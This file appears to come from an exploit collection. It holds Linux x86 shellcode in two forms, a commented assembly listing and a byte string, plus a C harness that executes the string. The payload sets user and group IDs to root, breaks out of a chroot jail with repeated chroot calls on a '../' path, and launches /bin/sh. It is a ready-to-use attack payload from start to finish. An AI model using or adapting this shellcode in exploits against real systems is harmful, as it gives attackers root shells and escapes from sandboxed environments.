/*
.file "chroot"
.version "01.01"
.globl main
	.type main,@function
main :
	pushl %ebp              # shcode recognition
	#init
	movl %esp,%ebp          # save stackpointer
	xorl %eax,%eax          
	xorl %ebx,%ebx          # reset the registers
	xorl %ecx,%ecx
	
	# setuid(0);
	movb $0x17,%al          # 0x17 = SYS_setuid
	int  $0x80
	
	# setgid(0);
	movb $0x2e,%al          # 0x2e = SYS_setgid
	int  $0x80
	
	# mkdir("sh");
	jmp  0x39
	popl %esi               # get the address of our string
	movb $0x27,%al          # 0x27 = SYS_mkdir
	leal 0x5(%esi),%ebx 	# string location
	movb $0xed,%cl          # mode
	int  $0x80
	
	# chroot("sh");
	# string addy is in %ebx
	movb $0x3d, %al         # 0x3d = SYS_chroot
	int  $0x80
	
	# construct string "../../../../../../../../../../"
	movl $0xff2f2e2e,%edx   # "../"
	leal 0x4(%ebp),%ebx     # save addy of the new string
	movb $0x10,%cl          # set the counter
	movl %edx,0x4(%ebp)     # construct the string
	addl $0x3,%ebp
	loopne  -0x8
	movl %ecx,0x4(%ebp)        # put in a NULL
	
	# chroot("../../../../../../../../../../");
	movb $0x3d,%al          # Ox3d = SYS_chroot
	int  $0x80
	
	# arg[0] = "/bins/sh";
	# arg[1] = 0x0
	# execve(arg[0],arg);
	movl %esi,%ebx
	movl %esi,0x8(%ebp)
	movl %ecx,0xc(%ebp)
	movb $0xb,%al
	leal 0x8(%ebp),%ecx
	leal 0xc(%ebp),%edx
	int  $0x80
	
	call -0x3e
	.string "/bin/sh"	# doesn't have to be in here
*/

#define CODESIZE 88
#define NAME "setuid,break-chroot,exec-shell"
char code[]=
"\x55\x89\xe5\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\xb0\x2e\xcd\x80"
"\xeb\x39\x5e\xb0\x27\x8d\x5e\x05\xb1\xed\xcd\x80\xb0\x3d\xcd\x80\xba"
"\x2e\x2e\x2f\xff\x8d\x5d\x04\xb1\x10\x89\x55\x04\x83\xc5\x03\xe0\xf8"
"\x89\x4d\x04\xb0\x3d\xcd\x80\x89\xf3\x89\x75\x08\x89\x4d\x0c\xb0\x0b"
"\x8d\x4d\x08\x8d\x55\x0c\xcd\x80\xe8\xc2\xff\xff\xff/bin/sh";
main()
{
  int (*funct)();
  funct = (int (*)()) code;
  printf("%s shellcode\n\tSize = %d\n",NAME,strlen(code));
  (int)(*funct)();
}
